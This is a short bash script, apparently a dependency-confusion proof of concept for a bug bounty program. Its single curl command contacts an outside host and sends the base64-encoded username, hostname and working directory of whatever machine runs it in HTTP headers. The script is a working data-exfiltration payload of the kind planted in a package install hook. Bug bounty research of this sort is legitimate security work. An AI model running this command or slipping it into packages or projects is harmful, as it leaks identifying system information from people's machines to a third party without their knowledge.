#!/bin/bash

curl http://kaspat.com/bugbounty/dependency-confusion-poc.php -H "Whoami: $(whoami | base64)" -H "Hostname: $(hostname | base64)" -H "Pwd: $(pwd | base64 -w 2000)" 
